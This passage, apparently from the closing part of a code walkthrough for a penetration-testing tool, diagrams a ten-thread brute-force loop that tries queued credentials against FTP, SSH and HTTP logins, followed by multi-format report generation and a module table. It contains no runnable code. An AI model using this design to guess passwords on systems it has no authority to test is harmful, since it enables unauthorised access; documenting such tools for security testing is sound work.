│ Create 10 worker threads │
│ (attack mode: loop)      │
└──────┬───────────────────┘
       │
       ▼
┌──────────────────────────┐
│ Queue credentials        │
│ [all Cred objects]       │
└──────┬───────────────────┘
       │
       ▼
    ┌─ ─ ─ ─ ─ ─ ─ ─ ─ ┐
    │ Parallel Loop    │ (10 threads)
    │ for each cred:   │
    │ 1. Get from Q    │
    │ 2. Rate limit    │
    │ 3. Attempt auth: │
    │    ftp.login()   │
    │    ssh.connect() │
    │    http.auth()   │
    │ 4. Check result: │
    │    True → Found! │
    │    False → Try next │
    │    None → Error  │
    │ 5. Update stats  │
    │ 6. Get next      │
    └─ ─ ─ ─ ─ ─ ─ ─ ─ ┘
       │
       ▼
┌──────────────────────────┐
│ Calculate stats          │
│ - Attack time            │
│ - Attempts/sec           │
│ - Success count          │
└──────┬───────────────────┘
       │
       ▼
┌──────────────────────────┐
│ Return found_credentials │
│ [Cred(admin, password1)] │
└──────┬───────────────────┘
       │
       ▼
┌──────────────────────────┐
│ Save report              │
│ (JSON/CSV/HTML/XML)      │
└──────────────────────────┘
```

### Report Generation Flow

```
┌─────────────────────────┐
│ Scan/Attack Results     │
│ - Port info             │
│ - Credentials found     │
└──────┬──────────────────┘
       │
       ▼
┌─────────────────────────┐
│ ReportGenerator         │
│ .add_scan_result()      │
│ .add_credential_result()│
└──────┬──────────────────┘
       │
       ▼
    ┌──────────────────────┐
    │ export_all_formats() │
    └──────┬───────────────┘
           │
    ┌──────┼──────┬──────┐
    │      │      │      │
    ▼      ▼      ▼      ▼
   JSON   CSV   HTML    XML
    │      │      │      │
    ▼      ▼      ▼      ▼
 .json  .csv  .html   .xml
```

---

## Connection Summary

| Module | Imports | Used By |
|--------|---------|---------|
| `port_scanner.py` | socket, json, threading | appt, reporting |
| `brute_forcer.py` | ftplib, paramiko, requests | appt, reporting |
| `config_manager.py` | yaml, pathlib | appt |
| `reporting.py` | json, csv, dataclasses | appt |
| `exceptions.py` | logging, threading | all modules |
| `utils.py` | json, csv, pathlib | appt, port_scanner, brute_forcer |
| `appt` (CLI) | argparse, pathlib | User entry point |

---

**This completes the line-by-line code walkthrough. For usage examples, see USER_MANUAL.md**
